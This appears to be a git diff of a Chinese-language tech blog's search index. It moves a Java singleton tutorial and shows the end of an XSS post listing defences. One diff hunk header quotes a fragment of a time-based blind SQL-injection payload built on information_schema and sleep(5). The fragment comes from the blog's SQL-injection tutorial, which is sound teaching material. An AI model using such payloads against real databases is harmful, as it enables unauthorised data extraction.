+                <p>1597322751829</p>
+            </figure>
+
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
+<li>对用户输入输出字符进行安全过滤和转义</li>
+<li>Cookie属性HttpOnly设置为true，防止被JS调用</li>
+<li>检查HTTP Referer是否来自预料中的 URL</li>
+</ol>
+<hr>
+]]></content>
+      
+        <categories>
+            
+            <category> web安全 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> web安全 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[web安全-SQL注入]]></title>
       <url>/2021/01/24/SQL%E6%B3%A8%E5%85%A5/</url>
       <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><blockquote>
@@ -2944,6 +3286,43 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
     </entry>
     
     <entry>
+      <title><![CDATA[Java单例设计]]></title>
+      <url>/2019/10/05/Java%E5%8D%95%E4%BE%8B%E8%AE%BE%E8%AE%A1/</url>
+      <content type="html"><![CDATA[<h1 id="单例设计"><a href="#单例设计" class="headerlink" title="单例设计"></a>单例设计</h1><p><code>通过单例模式的方法创建的类在当前进程中只有一个实例，并且自行实例化向整个系统提供</code></p>
+<ul>
+<li>饿汉式</li>
+</ul>
+<blockquote>
+<p>自动加载</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton INSTANCE = <span class="keyword">new</span> Singleton() ;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;	<span class="comment">// 构造方法私有化了</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;<span class="comment">//向外提供静态访问方法</span></span><br><span class="line">		<span class="keyword">return</span> INSTANCE ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">		Singleton instance = <span class="keyword">null</span> ;	<span class="comment">// 声明对象</span></span><br><span class="line">		instance = Singleton.getInstance();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>懒汉式</li>
+</ul>
+<blockquote>
+<p>第一次使用才加载</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> Singleton instance ;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;	<span class="comment">// 构造方法私有化了</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;<span class="comment">//向外提供静态访问方法</span></span><br><span class="line">		<span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;	<span class="comment">// 第一次使用</span></span><br><span class="line">			instance = <span class="keyword">new</span> Singleton() ; <span class="comment">// 实例化对象</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> instance ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">		Singleton instance = <span class="keyword">null</span> ;	<span class="comment">// 声明对象</span></span><br><span class="line">		instance = Singleton.getInstance();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      
+        <categories>
+            
+            <category> Java </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> Java </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[Java-IO]]></title>
       <url>/2019/10/05/Java-IO/</url>
       <content type="html"><![CDATA[<h1 id="转换流"><a href="#转换流" class="headerlink" title="转换流"></a>转换流</h1><ul>
@@ -3027,43 +3406,6 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BufferedWriter</span><span class="params">(Writer out)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BufferedWriter</span><span class="params">(Writer out, <span class="keyword">int</span> size)</span></span></span><br></pre></td></tr></table></figure>
 
 <h1 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Scanner</span><span class="params">(InputStream source)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span></span>;<span class="comment">//判断是否还有数据</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">next</span><span class="params">()</span></span>;<span class="comment">//取出数据</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      
-        <categories>
-            
-            <category> Java </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> Java </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Java单例设计]]></title>
-      <url>/2019/10/05/Java%E5%8D%95%E4%BE%8B%E8%AE%BE%E8%AE%A1/</url>
-      <content type="html"><![CDATA[<h1 id="单例设计"><a href="#单例设计" class="headerlink" title="单例设计"></a>单例设计</h1><p><code>通过单例模式的方法创建的类在当前进程中只有一个实例，并且自行实例化向整个系统提供</code></p>
-<ul>
-<li>饿汉式</li>
-</ul>
-<blockquote>
-<p>自动加载</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton INSTANCE = <span class="keyword">new</span> Singleton() ;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;	<span class="comment">// 构造方法私有化了</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;<span class="comment">//向外提供静态访问方法</span></span><br><span class="line">		<span class="keyword">return</span> INSTANCE ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">		Singleton instance = <span class="keyword">null</span> ;	<span class="comment">// 声明对象</span></span><br><span class="line">		instance = Singleton.getInstance();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>懒汉式</li>
-</ul>
-<blockquote>
-<p>第一次使用才加载</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> Singleton instance ;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;	<span class="comment">// 构造方法私有化了</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;<span class="comment">//向外提供静态访问方法</span></span><br><span class="line">		<span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;	<span class="comment">// 第一次使用</span></span><br><span class="line">			instance = <span class="keyword">new</span> Singleton() ; <span class="comment">// 实例化对象</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> instance ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">		Singleton instance = <span class="keyword">null</span> ;	<span class="comment">// 声明对象</span></span><br><span class="line">		instance = Singleton.getInstance();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       
